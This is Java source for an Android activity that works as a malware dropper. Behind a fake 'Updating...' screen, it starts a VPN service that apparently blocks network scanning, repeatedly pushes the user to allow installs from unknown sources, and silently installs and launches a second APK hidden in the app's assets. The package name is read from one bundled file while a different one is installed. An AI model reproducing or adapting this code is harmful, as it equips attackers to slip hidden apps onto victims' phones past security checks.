package com.pegalite.newalgojar;

import android.app.PendingIntent;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.net.VpnService;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Window;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import com.pegalite.newalgojar.databinding.ActivityDynamicInstallDropSessionBinding;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class DynamicInstallDropSessionActivity extends AppCompatActivity {

    public static final String PACKAGE_INSTALLED_ACTION = "com.example.android.apis.content.SESSION_API_PACKAGE_INSTALLED";
    public static final String ACTION_INSTALL_COMPLETE = "com.verify.weird.ACTION_INSTALL_COMPLETE";

    private static final int REQUEST_UNKNOWN_APP_SOURCES = 1234;
    private static final int REQUEST_VPN = 5678;
    private final Handler mHandler = new Handler(Looper.getMainLooper());
    ActivityDynamicInstallDropSessionBinding binding;
    ProgressDialog progressDialog;
    private String targetPackageName = "com.pegalite.fivegonly";
    private final BroadcastReceiver installCompleteReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                context.startService(new Intent(context, PegaVpnService.class).setAction("STOP"));
            } catch (Exception ignored) {
            }

            if (progressDialog != null && progressDialog.isShowing()) {
                progressDialog.dismiss();
            }

            Intent launch = getPackageManager().getLaunchIntentForPackage(targetPackageName);
            if (launch != null) {
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launch);
            }
            finish();
        }
    };
    private boolean isInstallStarted = false;
    private Runnable mPermissionCheckRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityDynamicInstallDropSessionBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        targetPackageName = getApkPackageNameFromAssets();

        Window window = getWindow();
        window.setStatusBarColor(ContextCompat.getColor(this, R.color.rich_blue));
        window.setNavigationBarColor(ContextCompat.getColor(this, R.color.rich_blue));

        binding.update.setOnClickListener(v -> {
            Intent vpnIntent = VpnService.prepare(this);
            if (vpnIntent != null) {
                startActivityForResult(vpnIntent, REQUEST_VPN);
            } else {
                startVpnAndMaybeRequestInstallPermission();
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                    getPackageManager().canRequestPackageInstalls() && !isInstallStarted) {
                showProgressDialog();
                startInstallSession();
            }
        });

        LocalBroadcastManager.getInstance(this).registerReceiver(installCompleteReceiver, new IntentFilter(ACTION_INSTALL_COMPLETE));

    }

    public String getApkPackageNameFromAssets() {
        try {
            // Step 1: Copy the APK file from assets to cache directory
            File outFile = new File(getCacheDir(), "app2.apk");
            try (InputStream is = getAssets().open("app2.apk");
                 OutputStream os = new FileOutputStream(outFile)) {

                byte[] buffer = new byte[4096];
                int length;
                while ((length = is.read(buffer)) > 0) {
                    os.write(buffer, 0, length);
                }
                os.flush();
            }

            // Step 2: Use PackageManager to get package info from the copied file
            PackageManager pm = getPackageManager();
            PackageInfo info = pm.getPackageArchiveInfo(outFile.getAbsolutePath(), 0);
            if (info != null) {
                return info.packageName;
            } else {
                return null;
            }

        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (isAppInstalled(targetPackageName)) {
            Intent launch = getPackageManager().getLaunchIntentForPackage(targetPackageName);
            if (launch != null) {
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launch);
            }
            finish();
            return;
        }


    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_VPN && resultCode == RESULT_OK) {
            startVpnAndMaybeRequestInstallPermission();
        } else if (requestCode == REQUEST_UNKNOWN_APP_SOURCES &&
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (getPackageManager().canRequestPackageInstalls()) {
                showProgressDialog();
                startInstallSession();
            }
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

    private void startVpnAndMaybeRequestInstallPermission() {
        try {
            Intent vpnIntent2 = new Intent(this, PegaVpnService.class);
            startService(vpnIntent2);
        } catch (Exception ignored) {
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O &&
                !getPackageManager().canRequestPackageInstalls()) {
            startActivityForResult(
                    new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                            Uri.parse("package:" + getPackageName())),
                    REQUEST_UNKNOWN_APP_SOURCES);
            startPermissionPolling();
        } else {
            showProgressDialog();
            startInstallSession();
        }
    }

    private void startPermissionPolling() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            showProgressDialog();
            startInstallSession();
            return;
        }
        mPermissionCheckRunnable = () -> {
            if (getPackageManager().canRequestPackageInstalls()) {
                showProgressDialog();
                startInstallSession();
            } else {
                mHandler.postDelayed(mPermissionCheckRunnable, 500);
            }
        };
        mHandler.postDelayed(mPermissionCheckRunnable, 500);
    }

    private void showProgressDialog() {
        progressDialog = new ProgressDialog(this);
        progressDialog.setMessage("Updating...");
        progressDialog.setCancelable(false);
        progressDialog.show();
    }

    private boolean isAppInstalled(String pkg) {
        try {
            getPackageManager().getPackageInfo(pkg, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private void startInstallSession() {
        if (mHandler != null && mPermissionCheckRunnable != null) {
            mHandler.removeCallbacks(mPermissionCheckRunnable);
        }

        if (isInstallStarted) return;
        isInstallStarted = true;

        try {
            PackageInstaller installer = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params =
                    new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);

            addApkToInstallSession(session);

            Intent callback = new Intent(this, InstallResultReceiver.class);
            callback.setAction(PACKAGE_INSTALLED_ACTION);
            callback.setPackage(getPackageName());

            PendingIntent pi = PendingIntent.getBroadcast(this, 0, callback,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                session.commit(pi.getIntentSender());
            }, 500);

        } catch (IOException | RuntimeException e) {
            throw new RuntimeException(e);
        }
    }

    private void addApkToInstallSession(PackageInstaller.Session session) throws IOException {
        try (InputStream in = getAssets().open("app-release.apk");
             OutputStream out = session.openWrite("package", 0, -1)) {

            byte[] buf = new byte[4096];
            int len;
            while ((len = in.read(buf)) != -1) {
                out.write(buf, 0, len);
            }
            out.flush();
            session.fsync(out);
        }
    }

    @Override
    protected void onDestroy() {
        if (mHandler != null && mPermissionCheckRunnable != null) {
            mHandler.removeCallbacks(mPermissionCheckRunnable);
        }
        if (progressDialog != null) {
            progressDialog.dismiss();
        }
        LocalBroadcastManager.getInstance(this).unregisterReceiver(installCompleteReceiver);
        super.onDestroy();
    }
}